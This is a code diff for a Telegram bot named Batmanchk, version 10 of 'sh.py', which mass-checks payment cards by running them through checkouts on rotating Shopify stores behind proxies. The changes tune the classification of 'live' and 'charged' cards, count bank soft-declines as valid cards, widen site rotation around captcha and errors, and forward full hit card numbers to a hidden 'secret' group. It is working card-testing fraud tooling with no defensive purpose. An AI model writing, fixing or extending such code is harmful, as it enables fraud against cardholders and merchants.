@@ -1,14 +1,33 @@
 """
-sh.py  v9  —  /sh single-card  +  /msh mass Shopify checker  (PTB v20+)
+sh.py  v10  —  /sh single-card  +  /msh mass Shopify checker  (PTB v20+)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-v9 bug-fixes
-  • cb_msh_result: removed double query.answer() — was killing all button alerts
-  • _RL.wait(): fixed burst-counter reset logic (was growing unbounded)
-  • _clean_resp: removed redundant 're' import inside function
-  • RETRY_PATTERNS: removed overly-broad 'failed' entry
-  • asyncio.Lock created lazily (not at module import time)
-  • Mass worker exception string cleaned before storing
-  • All query.answer() calls consolidated — one per code path
+Base: v8 (known-working).  Targeted fixes applied on top:
+
+FIX 1 — cb_msh_result: removed pre-emptive query.answer() at top of handler.
+         Telegram allows exactly ONE answer() per callback query.  The old
+         code answered immediately (blank ack) then tried to answer again for
+         every alert/error branch — all those second calls threw BadRequest and
+         the user saw nothing.  Each branch now answers exactly once.
+
+FIX 2 — cb_msh_stop: removed _is_locked check.  Stop must ALWAYS work
+         instantly regardless of the button-lock timer.
+
+FIX 3 — _clean_resp used for DISPLAY ONLY.  Never called before
+         classify_response — that broke RETRY pattern matching because
+         "connection_error: …" was cleaned to "Connection Error" BEFORE the
+         classifier looked for 'connection_error'.
+
+FIX 4 — classify_response: added PAYMENT_AUTHORIZED, SUBSCRIPTION_CREATED,
+         PAYMENT_CAPTURED, TRANSACTION_APPROVED → CHARGED;  added
+         DO_NOT_HONOR, CALL_ISSUER, PICK_UP_CARD → LIVE (real card, bank
+         soft-block — not a hard decline); removed those three from
+         DECLINED_PATTERNS.
+
+FIX 5 — BUTTON_LOCK_SECONDS: 30 → 5 (download buttons only).
+
+FIX 6 — SH_SITE_RETRIES: 6 → 15;  SITE_RETRIES (mass): 6 → 12.
+         'failed' kept in RETRY_PATTERNS — API returns "step N failed"
+         responses that must rotate, not be classified as DEAD.
 """
 
 from __future__ import annotations
@@ -57,7 +76,7 @@ from config import (
 )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CONFIG
+# CONFIG  — edit group IDs before deploying
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 BOT_CHANNEL      = "https://t.me/Batcardchk"
 BOT_DISPLAY      = "Batmanchk"
@@ -68,28 +87,28 @@ FALLBACK_SITE    = "aloracosmetics.myshopify.com"
 
 HIT_LOG_GROUP_ID       = -1004361062205
 SECRET_GROUP_ID        = -1004499920555
-CHARGED_SHARE_GROUP_ID = 0               # legacy — not used
+CHARGED_SHARE_GROUP_ID = 0               # legacy — unused
 
 SH_COOLDOWN      = 25                    # seconds, trial users only
 
 # ── Speed knobs — single-card /sh ─────────────────────
-SH_SITE_RETRIES  = 15                    # try up to 15 sites per card
-SH_SITE_TIMEOUT  = 11                    # seconds per attempt
+SH_SITE_RETRIES  = 15                    # FIX 6: was 6
+SH_SITE_TIMEOUT  = 11
 SH_TCP_LIMIT     = 200
 SH_TCP_PER_HOST  = 80
 
 # ── Speed knobs — mass /msh ─────────────────────────────
 MAX_CONCURRENT       = 150
-SITE_RETRIES         = 12               # try 12 sites per card
+SITE_RETRIES         = 12               # FIX 6: was 6
 SITE_TIMEOUT         = 12
 TCP_LIMIT            = 600
 TCP_PER_HOST         = 200
 PROGRESS_INTERVAL    = 2.0
 PROGRESS_EVERY_N     = 5
-BUTTON_LOCK_SECONDS  = 5                # only download buttons lock; stop never locks
+BUTTON_LOCK_SECONDS  = 5               # FIX 5: was 30 — download buttons only; Stop never locks
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CUSTOM STICKER EMOJI IDs
+# ALL CUSTOM STICKER EMOJI IDs  — from msh.py
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 LIVE_EMOJI_ID         = "4958610528588008305"
 DECLINED_EMOJI_ID     = "4956612582816351459"
@@ -133,22 +152,11 @@ MSH_SESSIONS: dict[str, dict] = {}
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 _SH_CONNECTOR: Optional[aiohttp.TCPConnector] = None
 _SH_SESSION:   Optional[aiohttp.ClientSession] = None
-
-# Module-level BIN cache — shared across ALL /sh calls
 _SH_BIN_CACHE: dict[str, dict] = {}
 _SH_BIN_LOCKS: dict[str, asyncio.Lock] = {}
-# BUG FIX: create Lock lazily inside async context, not at import time
-_SH_BIN_META: Optional[asyncio.Lock] = None
-
-def _get_bin_meta_lock() -> asyncio.Lock:
-    """Lazily create the BIN meta-lock inside the running event loop."""
-    global _SH_BIN_META
-    if _SH_BIN_META is None:
-        _SH_BIN_META = asyncio.Lock()
-    return _SH_BIN_META
+_SH_BIN_META  = asyncio.Lock()
 
 async def _get_sh_session() -> aiohttp.ClientSession:
-    """Lazy-init persistent aiohttp session for /sh single-card."""
     global _SH_CONNECTOR, _SH_SESSION
     if _SH_SESSION is None or _SH_SESSION.closed:
         _SH_CONNECTOR = aiohttp.TCPConnector(
@@ -161,17 +169,15 @@ async def _get_sh_session() -> aiohttp.ClientSession:
         )
         _SH_SESSION = aiohttp.ClientSession(
             connector=_SH_CONNECTOR,
-            headers={"User-Agent": "Mozilla/5.0 (compatible; BatChk/9)"},
+            headers={"User-Agent": "Mozilla/5.0 (compatible; BatChk/10)"},
             timeout=aiohttp.ClientTimeout(total=SH_SITE_TIMEOUT + 3),
         )
     return _SH_SESSION
 
 async def _sh_bin_cached(bin6: str) -> dict:
-    """Fetch BIN data with module-level cache — never fetches same prefix twice."""
     if bin6 in _SH_BIN_CACHE:
         return _SH_BIN_CACHE[bin6]
-    meta = _get_bin_meta_lock()
-    async with meta:
+    async with _SH_BIN_META:
         if bin6 not in _SH_BIN_LOCKS:
             _SH_BIN_LOCKS[bin6] = asyncio.Lock()
         lk = _SH_BIN_LOCKS[bin6]
@@ -188,18 +194,21 @@ async def _sh_bin_cached(bin6: str) -> dict:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESPONSE CLASSIFICATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BUG FIX: removed overly-broad 'failed' — it matched too many real responses
-# and turned valid DEAD cards into RETRY loops, wasting all retry attempts.
+# IMPORTANT: classify_response is ALWAYS called on the RAW _readable_resp()
+# string — NEVER on the output of _clean_resp().  Cleaning before classifying
+# breaks pattern matching ('connection_error' → 'Connection Error', etc.).
+
 RETRY_PATTERNS = [
     'r4 token empty', 'r2 id empty', 'payment method is not shopify',
     'product not found', 'hcaptcha detected', 'tax ammount empty',
     'del ammount empty', 'product id is empty', 'py id empty',
-    'clinte token', 'hcaptcha_detected', 'receipt_empty',
+    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
     'site error! status: 429', 'site requires login', 'failed to get token',
-    'no valid products', 'not shopify', 'site not supported',
-    'validation_custom', 'connection error', 'error processing card',
-    'server error', 'buyer_identity_currency',
-    'token not found', 'invalid_response', 'curl error',
+    'no valid products', 'not shopify', 'site not supported', 'validation_custom',
+    'connection error', 'connection_error', 'error processing card',
+    '504', 'server error', 'client error', 'failed',
+    'buyer_identity_currency',
+    'token not found', 'invalid_response', 'resolve', 'curl error',
     'payments_credit_card_brand_not_supported', 'could not resolve host',
     'connect tunnel failed', 'timeout', 'proxy error',
     'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
@@ -215,30 +224,42 @@ RETRY_PATTERNS = [
     'missing receiptid', 'no_products', 'no_product', 'vault_failed',
     'merchandise_out_of_stock', 'connection timed out', 'connection failed',
     'api error', 'api timeout', 'connection reset', 'network error',
-    'unexpected error', 'invalid json', 'json decode', 'client error',
-    '504', 'connection_error',
+    'unexpected error', 'invalid json', 'json decode',
+    'buyer_identity_marketing_consent',
 ]
 
+# FIX 4: DO_NOT_HONOR / CALL_ISSUER / PICK_UP_CARD removed from DECLINED_PATTERNS
+# — they mean the card is REAL (bank soft-block), classified as LIVE below.
 DECLINED_PATTERNS = [
     'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
     'UNKNOWN_ERROR', 'Processing Error',
-    'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED', 'INVALID_PURCHASE_TYPE',
-    'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL',
-    'INCORRECT_NUMBER', 'EXPIRED_CARD', 'STOLEN_CARD',
-    'LOST_CARD', 'RESTRICTED_CARD', 'TRANSACTION_NOT_ALLOWED', 'card_declined',
-    'insufficient_funds_declined', 'fraudulent',
-    'security_violation', 'service_not_allowed', 'try_again_later',
-    'withdrawal_count_limit_exceeded',
-    # NOTE: DO_NOT_HONOR / CALL_ISSUER / PICK_UP_CARD → LIVE (real card)
+    'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
+    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
+    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
+    'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD', 'TRANSACTION_NOT_ALLOWED',
+    'card_declined', 'insufficient_funds_declined',
+    'lost_card', 'stolen_card', 'expired_card', 'incorrect_cvc',
+    'processing_error', 'fraudulent', 'restricted_card',
+    'security_violation', 'service_not_allowed', 'transaction_not_allowed',
+    'try_again_later', 'withdrawal_count_limit_exceeded',
+    # NOTE: do_not_honor / pickup_card are NOT here — they map to LIVE above
+    # (real card, bank soft-block).  Keeping them here would be dead code and
+    # would cause confusion when reading the classify_response logic.
 ]
 
 
 def classify_response(msg: str) -> str:
-    """Returns CHARGED | TDS | LIVE | DEAD | RETRY."""
+    """
+    Returns: CHARGED | TDS | LIVE | DEAD | RETRY
+
+    ALWAYS call this on the RAW _readable_resp() string.
+    Never pass cleaned/display text — it breaks pattern matching.
+    """
     mu = msg.upper()
     ml = msg.lower()
 
     # ── CHARGED ──────────────────────────────────────────────────────────
+    # FIX 4: added PAYMENT_AUTHORIZED, SUBSCRIPTION_CREATED, etc.
     if ("ORDER_PAID" in mu or "CHARGED" in mu or "CAPTURED" in mu
             or "PAYMENT_AUTHORIZED" in mu or "SUBSCRIPTION_CREATED" in mu
             or "PAYMENT_CAPTURED" in mu or "TRANSACTION_APPROVED" in mu):
@@ -256,7 +277,7 @@ def classify_response(msg: str) -> str:
         return "LIVE"
     if mu.strip() == "APPROVED" or ("APPROVED" in mu and "NOT" not in mu):
         return "LIVE"
-    # Real card — bank soft-block (not site error)
+    # FIX 4: real card — bank soft-block, NOT a site/compatibility error
     if ("DO_NOT_HONOR" in mu or "DO NOT HONOR" in mu
             or "CALL_ISSUER" in mu or "PICK_UP_CARD" in mu):
         return "LIVE"
@@ -267,13 +288,13 @@ def classify_response(msg: str) -> str:
     if any(d.upper() in mu for d in DECLINED_PATTERNS):
         return "DEAD"
 
-    # ── RETRY (site/network issue — rotate to next site) ─────────────────
+    # ── RETRY (site/network/delivery error) ───────────────────────────────
     if any(r.lower() in ml for r in RETRY_PATTERNS):
         return "RETRY"
     if mu.strip() in ("ERROR", "TIMEOUT", "UNKNOWN"):
         return "RETRY"
 
-    # Unknown response — treat as DEAD so we never loop forever
+    # Unknown — treat as DEAD so retries don't loop forever
     return "DEAD"
 
 
@@ -321,17 +342,15 @@ def _readable_resp(data: dict) -> str:
             return str(v).strip()
     return str(data)[:200]
 
+# FIX 3: _clean_resp is for DISPLAY ONLY — strip URLs and noise before showing
+# to the user.  It is NEVER called before classify_response.
 def _clean_resp(resp: str) -> str:
-    """Strip site URLs, NO_PRODUCTS noise, and internal error details.
-    BUG FIX: uses module-level 're' — no longer imports inside function."""
-    # Remove full URLs
+    """Strip site URLs, NO_PRODUCTS noise, and internal error details for display."""
     resp = re.sub(r'https?://\S+', '', resp)
-    # Remove "at <domain>" fragments
     resp = re.sub(r'\s+at\s+\S+', '', resp)
-    # NO_PRODUCTS: No products above $X.XX → just NO_PRODUCTS
     resp = re.sub(r'NO_PRODUCTS?:\s*[^,;\n]*', 'NO_PRODUCTS', resp, flags=re.IGNORECASE)
-    # connection_error: ... → clean label
     resp = re.sub(r'connection_error:\s*.*', 'Connection Error', resp, flags=re.IGNORECASE)
+    resp = re.sub(r'CONNECTION_ERROR:\s*.*', 'Connection Error', resp, flags=re.IGNORECASE)
     resp = resp.strip().strip(':').strip()
     return resp if resp else "Declined"
 
@@ -381,24 +400,18 @@ def _load_proxies() -> list[str]:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MASS BIN CACHE  — per-session, deduplicates BIN lookups
+# MASS BIN CACHE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 class BinCache:
-    """Async per-BIN lock so each 6-digit prefix is fetched exactly once."""
     def __init__(self):
         self._cache: dict[str, dict] = {}
         self._locks: dict[str, asyncio.Lock] = {}
-        self._meta:  Optional[asyncio.Lock]  = None
-
-    def _get_meta(self) -> asyncio.Lock:
-        if self._meta is None:
-            self._meta = asyncio.Lock()
-        return self._meta
+        self._meta = asyncio.Lock()
 
     async def get(self, bin6: str) -> dict:
         if bin6 in self._cache:
             return self._cache[bin6]
-        async with self._get_meta():
+        async with self._meta:
             if bin6 not in self._locks:
                 self._locks[bin6] = asyncio.Lock()
             lk = self._locks[bin6]
@@ -414,8 +427,6 @@ class BinCache:
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # TELEGRAM RATE LIMITER
-# BUG FIX: burst counter now resets properly every window;
-#          was growing unbounded and locking up all progress edits.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 class _RL:
     def __init__(self, interval: float = 1.0, burst: int = 3):
@@ -424,32 +435,16 @@ class _RL:
         self._cnt      = 0
         self._reset    = 0.0
         self._last     = 0.0
-        self._lk:  Optional[asyncio.Lock] = None
-
-    def _lock(self) -> asyncio.Lock:
-        if self._lk is None:
-            self._lk = asyncio.Lock()
-        return self._lk
+        self._lk       = asyncio.Lock()
 
     async def wait(self):
-        async with self._lock():
+        async with self._lk:
             now = time.time()
-            # Reset the burst window every 5 seconds
-            if now - self._reset >= 5.0:
-                self._cnt  = 0
-                self._reset = now
-            if self._cnt >= self._burst:
-                # Burst exceeded — wait out the remainder of the window
-                delay = max(0.0, 5.0 - (now - self._reset))
-                if delay:
-                    await asyncio.sleep(delay)
-                self._cnt  = 0
-                self._reset = time.time()
-            else:
-                # Normal inter-call spacing
-                delay = max(0.0, self._interval - (now - self._last))
-                if delay:
-                    await asyncio.sleep(delay)
+            if now - self._reset > 5.0:
+                self._cnt, self._reset = 0, now
+            delay = 2.0 if self._cnt >= self._burst else max(0.0, self._interval - (now - self._last))
+            if delay:
+                await asyncio.sleep(delay)
             self._last = time.time()
             self._cnt += 1
 
@@ -506,7 +501,7 @@ def extract_cards(text: str) -> list[str]:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# GOSHOPI API CALL  — uses caller's session
+# GOSHOPI API CALL
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _call_shopii(
     session: aiohttp.ClientSession,
@@ -533,11 +528,11 @@ async def _call_shopii(
     except asyncio.CancelledError:
         raise
     except Exception as e:
-        return {"Response": f"connection_error: {str(e)[:60]}"}
+        return {"Response": f"connection_error: {str(e)[:80]}"}
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MULTI-SITE RETRY CORE  — shared by /sh and /msh
+# MULTI-SITE RETRY CORE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _check_card_with_retry(
     session: aiohttp.ClientSession,
@@ -548,10 +543,13 @@ async def _check_card_with_retry(
     site_timeout: float = SITE_TIMEOUT,
 ) -> tuple[str, str, str, str]:
     """
-    Returns (verdict, response_text, price, currency).
-    Tries up to max_sites DIFFERENT Shopify sites.
-    RETRY → silently rotate to next site+proxy.
-    Never exposes site URLs or internal errors to the user.
+    Returns (verdict, display_resp, price, currency).
+
+    FIX 3 applied here:
+      • classify_response() is called on the RAW _readable_resp() string.
+      • _clean_resp() is called AFTER classification, on the display string only.
+      • This ensures 'connection_error: ...', 'step N failed', etc. are still
+        matched by RETRY_PATTERNS and cause site rotation, not DEAD verdicts.
     """
     if not sites:
         sites = [FALLBACK_SITE]
@@ -564,16 +562,13 @@ async def _check_card_with_retry(
 
     tried: set[str] = set()
     price, currency = "0.00", "USD"
-    last_resp = "Declined"
+    last_raw  = "All sites exhausted"
+    last_disp = "All sites exhausted"
 
     for attempt in range(max_sites):
-        # Respect cancellation between attempts
-        try:
-            await asyncio.sleep(0)
-        except asyncio.CancelledError:
-            raise
+        if asyncio.current_task() and asyncio.current_task().cancelled():
+            raise asyncio.CancelledError()
 
-        # Pick untried site — cycle through full pool when exhausted
         untried = [s for s in site_pool if s not in tried]
         if not untried:
             tried.clear()
@@ -590,19 +585,23 @@ async def _check_card_with_retry(
         except Exception:
             continue
 
-        # BUG FIX: clean response BEFORE classify so RETRY patterns match clean text
-        resp_text = _clean_resp(_readable_resp(data))
-        last_resp = resp_text
-        price     = str(data.get("Price",    data.get("price",    "0.00"))).strip()
-        currency  = str(data.get("Currency", data.get("currency", "USD"))).strip()
-        verdict   = classify_response(resp_text)
+        # ── FIX 3: classify on RAW, clean for display only ─────────────
+        raw_resp  = _readable_resp(data)
+        disp_resp = _clean_resp(raw_resp)         # display only
+        verdict   = classify_response(raw_resp)   # classify on raw!
+
+        price    = str(data.get("Price",    data.get("price",    "0.00"))).strip()
+        currency = str(data.get("Currency", data.get("currency", "USD"))).strip()
+
+        last_raw  = raw_resp
+        last_disp = disp_resp
 
         if verdict in ("CHARGED", "LIVE", "TDS", "DEAD"):
-            return verdict, resp_text, price, currency
+            return verdict, disp_resp, price, currency
         # RETRY → silently continue to next site+proxy
 
     # Exhausted all attempts — card is dead or all sites busy
-    return "DEAD", last_resp, price, currency
+    return "DEAD", last_disp, price, currency
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -621,22 +620,21 @@ def _status_line(verdict: str, price: str = "", currency: str = "") -> tuple[str
         return (f'<b>{ch_link} Live {_rand_live()}</b>',
                 '<b>Gate ➳ Shopify 0-20$</b>')
     if verdict == "DEAD":
-        return (f'<b>{ch_link} Dead {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>',
+        return (f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>',
                 '<b>Gate ➳ Shopify 0-20$</b>')
-    return (f'<b>{ch_link} Dead {_te(PROG_DEAD_EMOJI_ID,"❌")}</b>',
+    return (f'<b>{ch_link} Error {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>',
             '<b>Gate ➳ Shopify 0-20$</b>')
 
 def _build_result(card, resp, verdict, bin_txt, price, currency, elapsed, user, plan) -> str:
     sl, gl = _status_line(verdict, price, currency)
-    # resp is already cleaned upstream; clean once more for safety
-    clean = _clean_resp(resp)
+    # resp is already the cleaned display string from _check_card_with_retry
     return (
         f'{sl}\n\n'
         f'<b>{_te(CARD_EMOJI_ID,"💳")}</b>\n'
         f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
         f'{gl}\n'
         f'<b>──────────</b>\n'
-        f'<b>Resp ➳ {escape(clean)}</b>\n'
+        f'<b>Resp ➳ {escape(resp)}</b>\n'
         f'<b>Bin  ➳ <code>{escape(bin_txt)}</code></b>\n'
         f'<b>──────────</b>\n'
         f'<b>{_te(TIME_EMOJI_ID,"⏱")} ➳ {_fmt_time(elapsed)}</b>\n'
@@ -672,7 +670,9 @@ def _kb_verdict(verdict: str) -> RawMarkup:
         return RawMarkup([[_btn("CHARGED", url=BOT_CHANNEL, style="success", icon=BTN_CHARGED_EMOJI_ID), _bot_btn()]])
     if verdict in ("LIVE", "TDS"):
         return RawMarkup([[_btn("LIVE", url=BOT_CHANNEL, style="success", icon=BTN_LIVE_EMOJI_ID), _bot_btn()]])
-    return RawMarkup([[_btn("DEAD", url=BOT_CHANNEL, style="danger", icon=BTN_DEAD_EMOJI_ID), _bot_btn()]])
+    if verdict == "DEAD":
+        return RawMarkup([[_btn("DEAD", url=BOT_CHANNEL, style="danger", icon=BTN_DEAD_EMOJI_ID), _bot_btn()]])
+    return RawMarkup([[_btn("ERROR", url=BOT_CHANNEL, style="secondary", icon=PROG_ERRORS_EMOJI_ID), _bot_btn()]])
 
 def _msh_buttons(sid: str, running: bool = True) -> RawMarkup:
     s   = MSH_SESSIONS.get(sid, {})
@@ -749,7 +749,7 @@ def _hit_text(card: str, resp: str, bin_data: dict, price: str, currency: str,
         f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
         f'{gl}\n'
         f'<b>──────────</b>\n'
-        f'<b>Resp ➳ {escape(_clean_resp(resp))}</b>\n'
+        f'<b>Resp ➳ {escape(resp)}</b>\n'
         f'<b>Bin  ➳ <code>{bi}</code></b>\n'
         f'<b>──────────</b>\n'
         f'<b>{_te(TIME_EMOJI_ID,"⏱")} ➳ {_fmt_time(elapsed)}</b>\n'
@@ -768,7 +768,7 @@ def _share_group_text(resp: str, price: str, currency: str,
     return (
         f'<b>HIT ➛ {label} {eid}</b>\n'
         f'<b>Gate ➛ {gate}</b>\n'
-        f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {escape(_clean_resp(resp))}</b>\n'
+        f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {escape(resp)}</b>\n'
         f'<b>User ➛ {fname} {plan_e}</b>'
     )
 
@@ -785,7 +785,6 @@ async def _send_hit_log(bot, resp: str, price: str, currency: str,
                         card: str = "", bin_data: dict = None):
     await _rl_hit.wait()
     bin_data = bin_data or {}
-
     if HIT_LOG_GROUP_ID:
         log_text = _share_group_text(resp, price, currency, user, plan, verdict)
         try:
@@ -798,7 +797,6 @@ async def _send_hit_log(bot, resp: str, price: str, currency: str,
             )
         except Exception as e:
             logging.error(f"[SH] hit-log → {HIT_LOG_GROUP_ID}: {e}")
-
     if SECRET_GROUP_ID and card:
         secret_text = _hit_text(card, resp, bin_data, price, currency, 0, user, plan, verdict)
         try:
@@ -905,7 +903,6 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         sess = await _get_sh_session()
-        # BIN lookup + gate call run in parallel — BIN never blocks the gate
         (verdict, resp_text, api_price, api_currency), bin_data = await asyncio.gather(
             _check_card_with_retry(sess, card, sites, proxies,
                                    max_sites=SH_SITE_RETRIES,
@@ -917,7 +914,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         verdict, resp_text, api_price, api_currency = "DEAD", "Timeout", "0.00", "USD"
         bin_data = {}
     except BaseException as e:
-        verdict, resp_text, api_price, api_currency = "DEAD", _clean_resp(str(e)[:80]), "0.00", "USD"
+        verdict, resp_text, api_price, api_currency = "DEAD", str(e)[:80], "0.00", "USD"
         bin_data = {}
 
     if not isinstance(bin_data, dict):
@@ -942,7 +939,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(text, parse_mode="HTML", reply_markup=kb,
                                             disable_web_page_preview=True)
         except Exception as e2:
-            logging.error(f"[SH] result send failed: {e2}")
+            logging.error(f"[SH] result send: {e2}")
 
     if verdict in ("CHARGED", "LIVE", "TDS"):
         asyncio.create_task(asyncio.gather(
@@ -1020,7 +1017,7 @@ def _generate_result_file(sess: dict, rtype: str, user_obj, plan: str):
         label = "Live"
     elif rtype == "dead":
         cards, label = sess.get("dead_cards", []), "Dead"
-    else:  # "all"
+    else:
         cards = (sess.get("charged_cards", []) + sess.get("live_cards", []) +
                  sess.get("dead_cards", []))
         label = "All"
@@ -1056,17 +1053,9 @@ def _generate_result_file(sess: dict, rtype: str, user_obj, plan: str):
 # PER-CARD MASS WORKER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _mass_worker(
-    sid: str,
-    card: str,
-    cc_num: str,
-    bot,
-    user_obj,
-    plan: str,
-    shared: aiohttp.ClientSession,
-    bin_cache: BinCache,
-    sem: asyncio.Semaphore,
-    sites: list[str],
-    proxies: list[str],
+    sid: str, card: str, cc_num: str, bot, user_obj, plan: str,
+    shared: aiohttp.ClientSession, bin_cache: BinCache,
+    sem: asyncio.Semaphore, sites: list[str], proxies: list[str],
 ):
     if _is_stopped(sid):
         return
@@ -1091,8 +1080,7 @@ async def _mass_worker(
         except asyncio.CancelledError:
             raise
         except Exception as e:
-            # BUG FIX: clean exception string before storing/showing
-            verdict, resp, price, currency = "DEAD", _clean_resp(str(e)[:80]), "0.00", "USD"
+            verdict, resp, price, currency = "DEAD", str(e)[:80], "0.00", "USD"
 
         elapsed = time.time() - t0
         sess    = MSH_SESSIONS.get(sid)
@@ -1117,8 +1105,7 @@ async def _mass_worker(
                 _send_hit_log(bot, resp, price, currency, user_obj, plan, "CHARGED",
                               card=card, bin_data=bin_data),
                 _send_user_dm(bot, user_obj, card, resp, bin_data, price, currency,
-                              elapsed, plan, "CHARGED",
-                              reply_to=sess.get("user_msg_id")),
+                              elapsed, plan, "CHARGED", reply_to=sess.get("user_msg_id")),
                 return_exceptions=True,
             ))
         elif verdict in ("LIVE", "TDS"):
@@ -1128,8 +1115,7 @@ async def _mass_worker(
                 _send_hit_log(bot, resp, price, currency, user_obj, plan, "LIVE",
                               card=card, bin_data=bin_data),
                 _send_user_dm(bot, user_obj, card, resp, bin_data, price, currency,
-                              elapsed, plan, "LIVE",
-                              reply_to=sess.get("user_msg_id")),
+                              elapsed, plan, "LIVE", reply_to=sess.get("user_msg_id")),
                 return_exceptions=True,
             ))
         else:
@@ -1139,8 +1125,7 @@ async def _mass_worker(
 
         chk = sess["checked"]
         if (verdict in ("CHARGED", "LIVE", "TDS") or
-                chk % PROGRESS_EVERY_N == 0 or
-                chk >= sess["total"]):
+                chk % PROGRESS_EVERY_N == 0 or chk >= sess["total"]):
             asyncio.create_task(_update_progress(bot, sid))
 
 
@@ -1148,10 +1133,8 @@ async def _mass_worker(
 # MASS BATCH RUNNER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _run_mass_batch(
-    bot, sid: str,
-    cards: list[tuple[str, str]],
-    user_obj, plan: str,
-    sites: list[str], proxies: list[str],
+    bot, sid: str, cards: list[tuple[str, str]],
+    user_obj, plan: str, sites: list[str], proxies: list[str],
 ):
     sess = MSH_SESSIONS.get(sid)
     if not sess:
@@ -1171,8 +1154,7 @@ async def _run_mass_batch(
     ) as shared:
         tasks = []
         for card, cc_num in cards:
-            if _is_stopped(sid):
-                break
+            if _is_stopped(sid): break
             t = asyncio.create_task(
                 _mass_worker(sid, card, cc_num, bot, user_obj, plan,
                              shared, bc, sem, sites, proxies)
@@ -1181,10 +1163,8 @@ async def _run_mass_batch(
             sess = MSH_SESSIONS.get(sid)
             if sess:
                 sess.setdefault("tasks", []).append(t)
-
         await asyncio.gather(*tasks, return_exceptions=True)
 
-    # ── Batch credit deduction ───────────────────────────
     sess = MSH_SESSIONS.get(sid)
     if sess:
         dead = sess.get("_batch_dead", 0)
@@ -1235,7 +1215,6 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML", disable_web_page_preview=True,
         ); return
 
-    # Block duplicate active session
     for s in MSH_SESSIONS.values():
         if s.get("user_id") == user.id and s.get("status") == "CHECKING":
             await update.message.reply_text(
@@ -1341,18 +1320,20 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CALLBACK HANDLERS — Stop + Result download
+# CALLBACK HANDLERS  — Stop + Result download
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    BUG FIX: removed the pre-emptive `await query.answer()` at the top.
-    Telegram only allows ONE answer() per callback query. The old code called
-    answer() immediately (line 1 of the handler), then tried to call it again
-    for every alert/error — those all threw BadRequest and the user saw nothing.
-    Now each branch answers exactly once with the right message.
+    FIX 1: NO pre-emptive query.answer() at the top.
+
+    Telegram allows exactly ONE answer() per callback query.
+    The old code called answer() immediately (blank ack) then tried to answer
+    again for every error alert — all those second calls threw BadRequest and
+    the user saw NO feedback on any button press.
+    Each branch below now calls answer() exactly once.
     """
     query = update.callback_query
-    # mshr_{sid}_{type}  — split at most twice so rtype can never be empty
+    # mshr_{sid}_{type}
     parts = query.data.split("_", 2)
     if len(parts) < 3:
         await query.answer("⚠️ Invalid button", show_alert=True)
@@ -1376,7 +1357,7 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
